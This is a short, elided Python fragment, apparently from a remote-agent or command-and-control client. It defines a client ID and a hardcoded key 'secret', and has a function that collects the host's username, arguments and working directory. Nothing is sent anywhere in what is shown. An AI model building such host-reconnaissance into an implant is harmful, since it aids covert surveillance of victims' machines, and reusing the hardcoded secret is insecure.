...
CLIENT_ID = os.getenv("CLIENT_ID") or '3f8eff13-60b4-416b-bcfa-5b91c79d63d2'
KEY = 'secret'
...
def hostinfoInstruction(instruction): 
    ...
    system_info.append(f"username = {getpass.getuser()}")
    system_info.append(f"sys.argv = {sys.argv}")
    system_info.append(f"cwd = {os.getcwd()}")
